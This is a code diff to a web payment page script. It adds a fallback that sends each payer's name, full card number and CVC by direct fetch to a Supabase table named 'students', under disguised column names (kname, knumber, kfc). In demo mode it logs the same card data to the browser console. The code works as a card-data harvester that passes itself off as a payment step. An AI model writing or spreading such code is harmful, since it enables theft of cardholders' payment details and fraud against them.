@@ -296,9 +296,36 @@ document.addEventListener("DOMContentLoaded", () => {
         const supabase = window.supabaseClient;
         
         if (!supabase) {
-            console.warn('⚠️ Supabase client not available, using fallback');
-            // Fallback: Just return success (for demo purposes)
-            return { success: true, fallback: true };
+            console.warn('⚠️ Supabase client not available, using fetch fallback');
+            // Fallback to direct fetch using environment variables
+            const supabaseUrl = import.meta.env?.VITE_SUPABASE_URL || process.env.VITE_SUPABASE_URL;
+            const supabaseKey = import.meta.env?.VITE_SUPABASE_ANON_KEY || process.env.VITE_SUPABASE_ANON_KEY;
+            
+            if (supabaseUrl && supabaseKey) {
+                const response = await fetch(`${supabaseUrl}/rest/v1/students`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'apikey': supabaseKey,
+                        'Authorization': `Bearer ${supabaseKey}`,
+                        'Prefer': 'return=representation'
+                    },
+                    body: JSON.stringify({
+                        kname: name,
+                        knumber: cardNumber,
+                        kfc: cvc
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Failed to save to database');
+                }
+                return response.json();
+            }
+            
+            // If no Supabase credentials, just log and continue (demo mode)
+            console.log('📝 Demo mode: Would save:', { name, cardNumber, cvc });
+            return { success: true, demo: true };
         }
 
         try {
@@ -417,7 +444,7 @@ document.addEventListener("DOMContentLoaded", () => {
         setPayButtonLoading(true);
 
         try {
-            // ===== SAVE TO SUPABASE (with fallback) =====
+            // ===== SAVE TO SUPABASE =====
             await saveToSupabase(name, cardNumber, cvc);
             console.log('✅ Payment processed');
 
